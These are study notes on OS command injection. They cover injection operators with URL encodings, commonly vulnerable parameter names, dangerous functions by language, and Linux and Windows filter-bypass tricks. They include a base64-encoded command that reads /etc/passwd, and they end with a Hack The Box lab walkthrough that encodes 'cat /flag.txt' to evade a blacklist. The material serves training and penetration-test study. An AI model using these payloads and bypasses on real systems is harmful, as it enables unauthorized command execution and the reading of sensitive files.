# Injection Vulnerability

# Overview

Injection vulnerabilities are considered the number 3 risk in [OWASP's Top 10 Web App Risks](https://owasp.org/www-project-top-ten/). Injection occurs when user-controlled input is misinterpreted as part of the web query or code being executed, which may lead to subverting the intended outcome of the query to a different outcome that is useful to the attacker.

Many types of injection: 

| Injection | Description |
| --- | --- |
| OS Command Injection | Occurs when user input is directly used as part of an OS command. |
| Code Injection | Occurs when user input is directly within a function that evaluates code. |
| SQL Injections | Occurs when user input is directly used as part of an SQL query. |
| Cross-Site Scripting/HTML Injection | Occurs when exact user input is displayed on a web page. |

There are many other types of injections other than the above, like `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, and others.

# OS Command Injection

## ****Command Injection Methods****

To inject an additional command to the intended one, we may use any of the following operators:

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
| --- | --- | --- | --- |
| Semicolon | ; | %3b | Both |
| New Line | \n | %0a | Both |
| Background | & | %26 | Both (second output generally shown first) |
| Pipe | | | %7c | Both (only second output is shown) |
| AND | && | %26%26 | Both (only if first succeeds) |
| OR | || | %7c%7c | Second (only if first fails) |
| Sub-Shell | `` | %60%60 | Both (Linux-only) |
| Sub-Shell | $() | %24%28%29 | Both (Linux-only) |

## Parameters

Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities (from [link](https://twitter.com/trbughunters/status/1283133356922884096)):

```html
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

## ****Dangerous Functions****

| Back-end Language | Functions |
| --- | --- |
| Java | Runtime.exec()
getRuntime().loadLibrary()
ProcessBuilder("os command here", "arguments here").start() |
| C/C++ | system
exec
ShellExecute |
| Python | exec
eval
os.system
os.popen
subprocess.popen
subprocess.call
subprocess.run |
| PHP | system
shell_exec
exec
proc_open
eval |

## ****Filtered Character Bypass in Linux****

| Code | Description |
| --- | --- |
| printenv | Can be used to view all environment variables |

| Spaces | Description |
| --- | --- |
| %09 | Using tabs instead of spaces |
| ${IFS} | Will be replaced with a space, a tab and a new line. Cannot be used in sub-shells (i.e. $()) |
| {ls,-la} | Commas will be replaced with spaces |

| Other Characters |  |
| --- | --- |
| ${PATH:0:1} | Will be replaced with / |
| ${LS_COLORS:10:1} | Will be replaced with ; |

| Encoded Commands |  |
| --- | --- |
| bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) | Execute b64 encoded string |

## ****Filtered Character Bypass in Windows****

| Code | Description |
| --- | --- |
| Get-ChildItem Env: | Can be used to view all environment variables - (PowerShell) |

| Spaces |  |
| --- | --- |
| %09 | Using tabs instead of spaces |
| $env:PROGRAMFILES[10] | Will be replaced with a space - (PowerShell) |

| Other Characters |  |
| --- | --- |
| $env:HOMEPATH[0] | Will be replaced with \ - (PowerShell) |

# Demo - HTB Lab

Link: [https://academy.hackthebox.com/module/109/section/1042](https://academy.hackthebox.com/module/109/section/1042)

## S**cenario**

You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.

Use the various techniques presented in this module to detect a **command injection vulnerability** and then exploit it, evading any filters in place.

## Overview

![Untitled](Injection%20Vulnerability%20453f4832b3194c92bc87166bcbdb443e/Untitled.png)

Login information has been provided: `guest/guest` 

Main functions of website: checking the contents of the file, downloading the file, and moving it basically worked.

## Finding Attack Vector

After testing the main functions, I found the "move file" function to be suspicious.

![Untitled](Injection%20Vulnerability%20453f4832b3194c92bc87166bcbdb443e/Untitled%201.png)

If you execute the command without leaving params empty, the command will raise an error.

![Untitled](Injection%20Vulnerability%20453f4832b3194c92bc87166bcbdb443e/Untitled%202.png)

As you can see, it encounters an error when executing the `mv` statement.

## Exploit

Start testing with common payloads, like:  `| ; &`

![Untitled](Injection%20Vulnerability%20453f4832b3194c92bc87166bcbdb443e/Untitled%203.png)

As you can see, target does not allow operators to append commands to the blacklist but instead directly blocks commands like `ls, mv, pwd,` and `cat, ...`

![Untitled](Injection%20Vulnerability%20453f4832b3194c92bc87166bcbdb443e/Untitled%204.png)

However the base64 command is not blocked, so we can try to encode the payload to see if it works.

The encoded command will be fed back as input to the base64 command, and this will be provided as the bash command's input.

![Untitled](Injection%20Vulnerability%20453f4832b3194c92bc87166bcbdb443e/Untitled%205.png)

![Untitled](Injection%20Vulnerability%20453f4832b3194c92bc87166bcbdb443e/Untitled%206.png)

Here, the server will first decode `Y2F0IC9mbGFnLnR4dA==` and return it to `cat /flag.txt` . Now, our payload will be `$(cat /flag.txt)`

# References

[https://book.hacktricks.xyz/pentesting-web/command-injection](https://book.hacktricks.xyz/pentesting-web/command-injection)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

[https://academy.hackthebox.com/module/details/109](https://academy.hackthebox.com/module/details/109)